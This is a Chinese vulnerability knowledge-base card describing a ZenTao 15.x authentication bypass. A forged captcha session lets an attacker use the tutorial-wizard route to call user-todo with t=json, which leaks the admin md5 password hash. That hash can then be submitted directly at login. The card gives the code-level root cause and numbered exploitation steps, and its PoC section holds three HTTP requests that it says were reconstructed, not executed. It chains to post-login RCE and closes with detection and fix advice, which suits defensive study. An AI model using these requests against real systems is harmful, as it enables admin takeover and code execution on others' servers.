---
id: web-generic-auth-zentao-15x-wizard-todo-json-md5-login
title: 禅道 15.x 前台：tutorial-wizard 跳板调 user-todo，t=json 泄露管理员 md5 哈希并直接登录
type: scenario
domain: web
path: web/generic/auth
technique: zentao-15x-wizard-todo-json-md5-login
aliases:
- 禅道 15.x 前台
- 禅道 tutorial wizard 跳板
- 禅道密码哈希泄露
- zentao md5 直接登录
- 禅道 md5(pass+rand)
tags:
- php
- zentao
- auth-bypass
- md5
- password-hash
- tutorial
- json
- session
cve: []
severity: high
confidence: high
affected_versions: 15.x
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V635
  verified_at: '2026-11-13T01:08:40+08:00'
  notes: 已对照原文与 img/17-27 核对：15.x isOpenMethod 对 tutorial-wizard 放行，wizard 按 $lang->tutorial->tasks 校验后 die(fetch(module,method,params))；user->todo 把 getById 的 user 对象直接赋给 view 且未 unset password；viewType=json 时 parseJSON 输出 json_encode($this->view)（img/25 泄露 admin md5）；登录在 strlen(password)==32 且 session->rand 为空时直接与存储 md5 比较（img/27）。原文只给代码与输出截图，未给完整请求，卡内 arg1/arg2/arg3 与 t=json 为按路由/截图重建，未执行。affected_versions=15.x 来自原文 15 版本利用章节。dedup：与 captcha 会话卡、repo 卡非同链。
---

## 一句话结论

15.x 中，伪造会话后可通过开放路由 `tutorial-wizard` 的 `fetch()` 跳板调用 `user` 模块 `todo` 方法；以 `t=json` 输出时 `view->user` 对象未清理 `password` 字段，JSON 直接泄露用户 md5 口令哈希。由于登录校验在 `session->rand` 为空时用存储哈希直接比对 32 位输入，把泄露的 md5 当密码提交即可登录后台。

## 原理

- **跳板**：`tutorial` 控制器 `wizard($module, $method, $params = '')` 先按 `$lang->tutorial->tasks` 校验模块在配置内，再 `die($this->fetch($module, $method, $params));`——`fetch()` 在服务端发起内部请求，把目标模块方法的输出当页面返回；只支持 GET。`user`、`product` 等任务的 nav 配置在 `$lang->tutorial->tasks`（如 createAccount → module user）。
- **泄露点**：`user` 控制器 `todo($userID, ...)` 执行 `$user = (int)$userID; $user = $this->user->getById($userID, 'id');`，随后 `$this->view->user = $user;` 并 `$this->display();`。其他方法（如 `my-team`）会 `foreach($users as $user) unset($user->password);`，`todo` 没有这一步，用户对象的全部属性进入视图。
- **JSON 输出**：`parse()` 在 `viewType == 'json'` 时调用 `parseJSON()`，其中 `$output['data'] = json_encode($this->view);`——视图里的 user 对象被完整序列化，包含 `password`（md5）。
- **md5 直接登录**：登录校验按长度分支：`<32` 用 `md5($password)` 查库；`==32` 时 `$hash = $this->session->rand ? md5($record->password . $this->session->rand) : $record->password; $user = $password == $hash ? $record : '';`。禅道口令存储为 `md5(明文)`，正常登录客户端提交 `md5(存储哈希+rand)`；若用全新会话直接 POST 登录、不先请求登录页的 `refreshRandom`，`session->rand` 为空，服务端退化为拿存储哈希直接比较——泄露的 32 位 md5 本身就是通行证。即使会话已设置 rand，客户端也能拿到 rand 值，知道存储哈希即可计算 `md5(哈希+rand)`。
- **为什么成立**：哈希泄露 + 32 位分支的 rand 可选 + `==` 宽松比较，三者叠加；不需要破解哈希。
- **边界**：`todo` 的 userID 需存在；wizard 只允许配置中列出的模块/方法且仅 GET；若目标改写了登录校验（强制服务端 rand 且不向客户端暴露、或 32 位分支去掉），该登录绕过失效。

## 触发条件

- 15.x 禅道；`misc-captcha` 伪造会话可用（15.0.1+）；`tutorial` 模块与 wizard 路由开放；`user-todo` 可经 wizard 调用（配置含 user 任务）。
- 目标存在可读用户（如 admin），登录校验为上述版本形态。

## 利用步骤

1. `GET /zentao/misc-captcha-user.html` 获取伪造会话 cookie（见关联卡）。
2. 通过 wizard 调 user-todo：让 wizard 的 `$module=user`、`$method=todo`、`$params=<目标 userID>`（位置参数/路由形态随版本；原文截图请求形如 `index.php?m=tutorial&f=wizard&arg1=9`），附加 `t=json`。
3. 从响应 JSON 的 `data.user.password` 读取 md5 哈希。
4. 用全新会话直接登录：POST `index.php?m=user&f=login`，`account=admin&password=<md5>`（session 无 rand 时）；若已有 rand，提交 `md5(<md5>+rand)`。
5. 登录成功后复用 api debug 文件包含完成 RCE（见关联卡）。

## PoC

```http
GET /zentao/misc-captcha-user.html HTTP/1.1
Host: target
```

```http
GET /zentao/index.php?m=tutorial&f=wizard&arg1=user&arg2=todo&arg3=9&t=json HTTP/1.1
Host: target
Cookie: zentaosid=<上一步会话>
```

```http
POST /zentao/index.php?m=user&f=login HTTP/1.1
Host: target
Cookie: <全新会话，不先访问登录页/refreshRandom>
Content-Type: application/x-www-form-urlencoded

account=admin&password=<上一步泄露的 32 位 md5>
```

```text
预期：第二步返回 JSON，data.user.password 为 md5；第三步登录成功进入后台。
（原文只给出 wizard 代码、todo 代码与 JSON 输出截图，未给完整请求；arg 位置参数按代码签名重建，未在真实目标执行。）
```

## 变体与关联

- 前置会话伪造：[[web-php-rce-zentao-captcha-session-repo-checkconnection-exec]]。
- 登录后 RCE 复用 api debug 文件包含：[[web-php-file-inclusion-zentao-api-debug-getmethod-basename-bypass]]。
- 16.x/17.x 的等价入口换成了 waterfall 越权与异常鉴权绕过：[[web-generic-auth-zentao-programpriv-waterfall-modules-bypass]]、[[web-generic-auth-zentao-endresponse-exception-deny-continue]]。
- 变体：若 `todo` 补上 unset password，可换其它未清理敏感字段的视图方法；若 32 位直登被修，仍需先破解哈希。

## 检测与防御

- 检测：未登录会话请求 `misc-captcha-*` 后紧接 `m=tutorial&f=wizard`；同一会话通过 wizard 访问 `user-todo` 且带 `t=json`；登录请求的 password 字段为 32 位 hex 且账号为 admin/高权限用户。
- 修复：`todo` 等视图输出前统一 `unset($user->password)`；`isLogon()` 校验真实登录态；登录 32 位分支必须强制服务端 rand 且不向客户端泄露，或改为服务端不可逆的慢哈希（bcrypt/argon2）并禁止哈希直登。
- 加固：wizard 路由仅教程流程内可用或下线；对 `t=json` 输出做字段白名单；监控异常的 md5 直登行为。
